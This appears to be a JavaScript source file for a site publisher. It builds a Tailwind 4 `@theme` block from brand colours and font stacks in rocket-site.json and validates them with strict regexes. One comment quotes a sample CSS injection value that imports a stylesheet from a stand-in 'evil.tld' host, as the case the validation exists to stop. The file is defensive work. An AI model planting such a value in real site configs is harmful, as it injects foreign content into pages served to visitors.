// The brand token bridge, as DATA (issue #167).
//
// ── What this replaced, and why it had to go ─────────────────────────────
//
// Until this file existed, a template's brand tokens lived in
// `tailwind.config.cjs`, and Tailwind 3 does not parse that file, it `require`s
// it: it is a CommonJS module and executing it is the documented behaviour of
// the tool. Every scaffolded site shipped one, because that is where the tokens
// lived, so BUILDING A CLIENT'S SITE EXECUTED CODE OUT OF THE CLIENT'S
// REPOSITORY. #148 moved that execution off the runner holding the agency's
// Cloudflare token, which closed the cross-client half, and said plainly that
// the remaining half -- the client's own code still running against the client's
// own site -- was a template-library change rather than a publisher patch.
//
// This is that change. Tailwind 4's theme is CSS-first (`@theme`), so there is
// no config module to execute; and the values themselves come from
// `rocket-site.json`, which is already the per-site config, already schema'd,
// and already read as data by everything else in the product. The publisher
// composes the `@theme` block from it. The config is therefore non-executable BY
// CONSTRUCTION rather than by convention: there is no file in a site repository
// that any build step interprets as code.
//
// ── The chain, which stays mechanical ────────────────────────────────────
//
//   rocket-site.json brand["color-accent"]  ->  --color-accent  ->  bg-accent
//
// A brand key `color-X` is the theme variable `--color-X` and the Tailwind
// colour name `X`. A brand key `font-X` is `--font-X` and the class `font-X`.
// Under Tailwind 3 this went through an `--rs-`-prefixed custom property and a
// config function that mapped it back, because v3 could not apply an opacity
// modifier to a bare `var()`. v4 emits the variable itself and writes the
// modifier as a `color-mix`, so the middle step is gone and there is one fewer
// name to learn.
//
// ── Why the values are VALIDATED here ────────────────────────────────────
//
// These strings come out of a client's repository and are written into a
// stylesheet that ships to that client's visitors. `rocket-site.json` is data,
// not code, and that is the point of the migration -- but data spliced into CSS
// without a shape check is a way to write CSS, and `font-sans: x; } @import
// url(https://evil.tld); a {` would be exactly that. So every value is held to
// the shape its own kind has: a colour is a hex literal, a font stack is a
// comma-separated list of family names. Anything else FAILS THE BUILD naming the
// key, rather than being escaped, dropped or best-guessed -- a brand token that
// silently did not apply is a client's site shipping in the wrong colours.
//
// The artifact guard's rule 5 is the backstop and still reads the compiled
// `styles.css` for `@import` and `url()` to a foreign origin, so a value that got
// past this would still not reach a client's visitors.
//
// ── Keys outside the closed set are IGNORED, not rejected ────────────────
//
// `brand` also carries `logo` and `favicon`, which are paths and not tokens, and
// a hand-edited site repository can carry anything at all. Emitting only the
// keys in the closed set means an unknown key cannot become a CSS declaration,
// so the key NAME is not an injection channel either.

/** Prefixes of a brand key that map to a Tailwind theme namespace. */
export const TOKEN_NAMESPACES = Object.freeze(["color-", "font-"]);

/** The attribute the alternate palette hangs off. See `behaviour.dark_mode`. */
export const THEME_ATTRIBUTE = "data-rs-theme";

/**
 * A colour, as `templates/rocket-site.schema.json` already requires: a hex
 * literal, so it can be diffed and contrast-checked mechanically. The schema
 * allows 3 or 6 digits; 4 and 8 are accepted here because they are the same
 * literal with alpha and a site repository may legitimately hand-edit one in.
 */
const COLOUR = /^#([0-9a-fA-F]{3,4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/;

/**
 * A font stack: family names, quoted or bare, separated by commas.
 *
 * Deliberately narrow. Every character that could end a declaration, open a
 * block, start an at-rule or begin a function is absent, which is what makes
 * this a value rather than a fragment of a stylesheet.
 */
const FONT_STACK = /^[A-Za-z0-9 ,._'"-]{1,300}$/;

/** The theme variable a brand key maps to, or null when it is not a token. */
export function tokenVariable(key) {
  const name = String(key ?? "");
  return TOKEN_NAMESPACES.some((p) => name.startsWith(p)) ? `--${name}` : null;
}

/**
 * Validate one token value. Returns null when it is fine, or a sentence saying
 * what is wrong with it.
 */
export function tokenProblem(key, value) {
  if (typeof value !== "string") {
    return `brand["${key}"] is ${value === undefined ? "missing" : typeof value}, and a brand token is a string.`;
  }
  if (key.startsWith("color-")) {
    return COLOUR.test(value.trim())
      ? null
      : `brand["${key}"] is ${JSON.stringify(value)}, which is not a hex colour. Brand colours are written ` +
          `as hex so they can be diffed and contrast-checked, and so a value out of a site repository ` +
          `cannot become anything other than a colour in the stylesheet this build ships.`;
  }
  return FONT_STACK.test(value.trim())
    ? null
    : `brand["${key}"] is ${JSON.stringify(value)}, which is not a plain font stack. A font stack is family ` +
        `names separated by commas, quoted where they contain spaces. Anything else is a fragment of a ` +
        `stylesheet rather than a value, and this string is written straight into the CSS a client's ` +
        `visitors load.`;
}

/** The token entries of a brand object, in a stable order, validated. */
export function tokensOf(brand, { where = "brand" } = {}) {
  const tokens = [];
  const problems = [];
  if (brand === undefined) return { tokens, problems };
  if (brand === null || typeof brand !== "object" || Array.isArray(brand)) {
    return { tokens, problems: [`${where} is present in rocket-site.json and is not an object.`] };
  }
  for (const key of Object.keys(brand).sort()) {
    const variable = tokenVariable(key);
    if (!variable) continue; // logo, favicon, and anything a site repo invented
    const problem = tokenProblem(key, brand[key]);
    if (problem) problems.push(where === "brand" ? problem : problem.replace("brand[", `${where}[`));
    else tokens.push([variable, String(brand[key]).trim()]);
  }
  return { tokens, problems };
}

const declarations = (tokens, indent) =>
  tokens.map(([name, value]) => `${indent}${name}: ${value};`).join("\n");

/**
 * The generated stylesheet fragment: an `@theme` block, plus the alternate
 * palette as a `[data-rs-theme="dark"]` override when the site declares one.
 *
 * The dark palette is DATA for the same reason the light one is. A client
 * rebrands by editing `rocket-site.json`; if the dark values lived in the
 * template's CSS instead, changing the accent colour would rebrand the site in
 * one theme and leave the other on the template's, which is a defect nobody
 * would see until a visitor toggled.
 *
 * It lands in `@layer base`, which comes after Tailwind's own `theme` layer, so
 * the override wins over the `:root` the `@theme` block produces without needing
 * a specificity trick. Utilities read `var(--color-*)`, so every one of them
 * follows. The exception, stated rather than discovered: an opacity modifier
 * (`bg-accent/90`) compiles to a `color-mix` on the variable PLUS a literal
 * fallback for browsers that cannot do `color-mix(in oklab, ...)`, and the
 * fallback carries the light value. Every browser that can render a modern
 * Tailwind build takes the variable. Measured on 4.3.3, not assumed.
 */
export function themeCss({ brand, brandDark } = {}) {
  const light = tokensOf(brand);
  const dark = tokensOf(brandDark, { where: "brand_dark" });
  const problems = [...light.problems, ...dark.problems];

  // Returned as two named pieces rather than one string the caller has to cut
  // back apart. buildInput puts them in different places, and a caller that
  // recovered them by splitting on "@layer base {" would be parsing its own
  // output -- which breaks the first time a template's CSS contains that text.
  const lightCss = light.tokens.length ? `@theme {\n${declarations(light.tokens, "  ")}\n}\n` : "";
  const darkCss = dark.tokens.length
    ? `@layer base {\n  [${THEME_ATTRIBUTE}="dark"] {\n${declarations(dark.tokens, "    ")}\n  }\n}\n`
    : "";
  return { light: lightCss, dark: darkCss, css: `${lightCss}${darkCss}`, problems };
}

/**
 * The whole build input the Tailwind CLI is pointed at.
 *
 * ── Why the template's CSS is INLINED rather than `@import`ed ────────────
 *
 * Because `@import "tailwindcss"` is resolved by Tailwind 4 against the
 * directory of the file that WRITES it, walking up for `node_modules`, and a
 * client's site repository has no `node_modules`. Measured, not assumed: an
 * `@import "tailwindcss"` inside a site's own `tailwind.css` fails with
 * "Can't resolve 'tailwindcss'" no matter where the CLI is invoked from. So the
 * one file that names the framework is this composed one, and the caller writes
 * it somewhere the framework resolves.
 *
 * That decides the rest of the shape. The template's CSS is text spliced in, so
 * a relative `@source` or `@import` inside it would resolve against the composed
 * file's directory rather than its own: the templates therefore declare no
 * sources of their own, and every source is passed in here as an ABSOLUTE path
 * by whoever is composing. The publisher passes the assembled publish directory,
 * because those are the bytes that will actually be served; `templates/
 * validate.mjs` passes the template directory, because that is what it is
 * checking. `source(none)` turns off Tailwind's automatic detection, which walks
 * up from the input file and would otherwise make the stylesheet depend on
 * whatever else happened to be in the tree.
 *
 * A source directory is emitted as `@source "<dir>/**\/*.html"` rather than as
 * the bare directory. A bare directory is scanned by Tailwind's own heuristic
 * walk, which honours `.gitignore` and skips binary files: pointed at a
 * publish directory that IS gitignored, it finds nothing and every class on
 * every page is purged. The explicit glob is not filtered.
 *
 * ── Order, which is load-bearing ─────────────────────────────────────────
 *
 *   1. `@import "tailwindcss"`, which must come first: it is a real CSS import.
 *   2. the `@source` declarations.
 *   3. the generated `@theme`, so the brand values ARE the theme.
 *   4. the template's own CSS, which may reference those variables.
 *   5. the generated dark override last, so it wins over anything the template's
 *      base layer says about the same variables.
 *
 * ── A Tailwind 3 input still builds, and that is deliberate ──────────────
 *
 * `@tailwind base;`, `@tailwind components;` and `@tailwind utilities;` are
 * inert in Tailwind 4 -- it emits nothing for them rather than failing -- so a
 * site published from the pre-migration template library is spliced in verbatim
 * and still gets a complete stylesheet: the framework comes from line 1 here,
 * and its brand utilities come from the `@theme` this file generates out of the
 * `rocket-site.json` that site has always carried. Its old `:root { --rs-color-*
 * }` block survives as dead custom properties, which cost nothing. What it does
 * NOT get is anything its `tailwind.config.cjs` said, because that file is never
 * read again -- and for the shipped templates the config said exactly the token
 * bridge that is now generated here. Measured against the real v1.13.0 beacon
 * and forge inputs, compiled by the real Tailwind 4 CLI, in
 * templates/legacy-build.test.mjs. That file lives under templates/ rather than
 * tests/ because it needs a Tailwind CLI and templates/ is the only package
 * that installs one.
 */
export function buildInput({ templateCss = "", brand, brandDark, sources = [] } = {}) {
  const { light, dark, problems } = themeCss({ brand, brandDark });

  const lines = [
    "/* Generated by the Rocket Sites publisher from the site's rocket-site.json.",
    " * Not committed and not published: it exists only as the input to this build.",
    " * Edit the brand values in rocket-site.json, and the rules in tailwind.css. */",
    '@import "tailwindcss" source(none);',
  ];
  for (const dir of sources) lines.push(`@source ${JSON.stringify(`${dir}/**/*.html`)};`);
  if (light) lines.push("", light.trim());
  if (templateCss.trim()) lines.push("", templateCss.trim());
  if (dark) lines.push("", dark.trim());
  return { css: `${lines.join("\n")}\n`, problems };
}
